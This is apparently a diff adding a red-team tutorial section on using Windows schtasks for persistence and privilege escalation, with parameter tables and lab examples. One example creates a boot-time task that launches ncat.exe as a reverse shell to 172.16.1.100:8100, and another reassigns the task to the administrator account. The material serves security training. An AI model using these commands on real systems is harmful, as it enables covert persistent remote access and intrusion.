@@ -600,3 +600,108 @@ The `wmic service` component allows operators to pull structured attributes incl
 
 ## Next Steps
 Interacting with Windows services via the command line is foundational for non-GUI post-exploitation and privilege escalation. Understanding how these components behave under different integrity levels ensures cleaner execution and better operational security. The subsequent sections will address the PowerShell equivalents of these commands and transition into Windows Scheduled Tasks.
+
+
+# Working with Scheduled Tasks (`schtasks.exe`)
+
+Scheduled tasks are a fundamental Windows feature used by System Administrators for automation, but they also serve as a highly effective **persistence mechanism** for attackers. The Task Scheduler monitors the host for specific conditions (triggers) and executes predefined actions once those conditions are met.
+
+## Red Teaming Context: Persistence Strategy
+
+During enterprise engagements, once initial access is achieved, `schtasks` provides a stealthy method to establish persistence. Instead of dropping conspicuous executables that might trigger AV/EDR solutions, a scheduled task can be configured to execute a reverse shell (e.g., via PowerShell or `ncat.exe`) upon user logon or system reboot. If executed successfully under a privileged account context, this can also facilitate concurrent privilege escalation (e.g., catching a `SYSTEM` shell).
+
+### Common Execution Triggers
+Tasks can be triggered based on various system events, including:
+* System boot (`ONSTART`)
+* User logon (`ONLOGON`)
+* Specific time/date schedules (Daily, Weekly, Monthly)
+* System idle state (`ONIDLE`)
+* Terminal Server session state changes
+
+---
+
+## Command Reference: `schtasks`
+
+The `schtasks` utility allows for command-line management of scheduled tasks. Below is the operational syntax for querying, creating, modifying, and deleting tasks. *Note: Always check `schtasks /?` for the complete parameter list.*
+
+### 1. Enumeration: `schtasks /query`
+Performs a local or remote host search to enumerate existing scheduled tasks. Output visibility is dependent on the execution privileges.
+
+| Parameter | Description |
+| :--- | :--- |
+| `/fo` | Output format. Valid values: `TABLE`, `LIST`, `CSV`. |
+| `/v` | Verbose mode. Displays advanced properties (use with `LIST` or `CSV`). |
+| `/nh` | No Header. Suppresses column headers in `TABLE` or `CSV` formats. |
+| `/s` | Target remote host (Format: `\\hostname` or IP). Defaults to `localhost`. |
+| `/u` & `/p` | Specifies the user context and password for remote execution (Requires Admin privileges). |
+
+**Example: Querying a specific task with verbose list output**
+```cmd
+C:\htb> SCHTASKS /Query /TN "\Check Network Access" /V /FO list
+
+Folder: \  
+HostName:                             DESKTOP-Victim
+TaskName:                             \Check Network Access
+Status:                               Ready
+Logon Mode:                           Interactive only
+Author:                               DESKTOP-Victim\htb-admin
+Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
+Scheduled Task State:                 Enabled
+Run As User:                          tru7h
+Schedule Type:                        At system start up
+```
+
+### 2. Persistence: `schtasks /create`
+Schedules a new task. This is the primary method for establishing scheduled callback mechanisms.
+
+| Parameter | Description |
+| :--- | :--- |
+| `/sc` | Schedule type (e.g., `MINUTE`, `HOURLY`, `DAILY`, `ONSTART`, `ONLOGON`). |
+| `/tn` | Task Name (Must be unique). |
+| `/tr` | Task Run. The binary, script, or command to execute. |
+| `/ru` | Run As User. The user account context to run the task under. |
+| `/rp` | Run As Password. The password for the specified user. |
+| `/rl` | Run Level. Privileges for the task (`LIMITED` or `HIGHEST`). |
+| `/z`  | Mark task for deletion after its final run. |
+
+**Example: Creating an `ONSTART` reverse shell callback**
+Creates a persistent callback utilizing a dropped `ncat.exe` payload that executes on every system boot.
+```cmd
+C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
+
+SUCCESS: The scheduled task "My Secret Task" has successfully been created.
+```
+
+### 3. Modification: `schtasks /change`
+Modifies the properties of an existing task. Useful for lateral movement or privilege escalation if administrative credentials have been compromised.
+
+| Parameter | Description |
+| :--- | :--- |
+| `/tn` | Identifies the Target Task to modify. |
+| `/tr` | Modifies the program/action to execute. |
+| `/ru` & `/rp`| Updates the execution credentials. |
+| `/ENABLE` | Enables the task. |
+| `/DISABLE`| Disables the task. |
+
+**Example: Elevating task execution context to Administrator**
+```cmd
+C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
+
+SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
+```
+*Note: You can verify these changes by re-running the `/query` command for the specific `/tn` to check the updated `Run As User` attribute (e.g., now running as `SYSTEM`).*
+
+### 4. Cleanup: `schtasks /delete`
+Removes the scheduled task from the system. Crucial for the post-engagement cleanup phase to avoid leaving rogue artifacts.
+
+| Parameter | Description |
+| :--- | :--- |
+| `/tn` | Identifies the Target Task to delete. |
+| `/f` | Force deletion. Suppresses the interactive confirmation prompt. |
+
+**Example: Forcing deletion of the persistence artifact**
+```cmd
+C:\htb> schtasks /delete /tn "My Secret Task" /f
+
+SUCCESS: The scheduled task "My Secret Task" was successfully deleted.
+```
